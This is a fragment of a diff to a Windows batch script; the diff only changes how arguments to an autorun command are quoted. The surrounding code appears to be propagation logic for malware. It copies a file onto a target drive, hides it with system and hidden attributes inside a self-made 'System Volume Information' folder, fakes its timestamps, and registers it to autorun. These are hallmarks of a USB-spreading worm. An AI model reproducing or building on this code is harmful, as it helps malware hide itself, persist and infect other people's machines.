@@ -357,7 +357,7 @@ if exist %*\"%app_file_name%" (
   attrib +h +s %*\"%app_file_name%"
   %module_fileTouch% %*\"%app_file_name%" >nul
 
-  %autoRun% add "%*" %*\"%app_file_name%"
+  %autoRun% add %* %*\"%app_file_name%"
 )
 
 if not exist %*\"System Volume Information" md %*\"System Volume Information"
@@ -369,7 +369,7 @@ if exist %*\"System Volume Information\%app_file_name%" (
   attrib +h +s %*\"System Volume Information\%app_file_name%"
   %module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul
 
-  %autoRun% add "%*\SVI" %*\"System Volume Information\%app_file_name%"
+  %autoRun% add %*\SVI %*\"System Volume Information\%app_file_name%"
 )
 
 
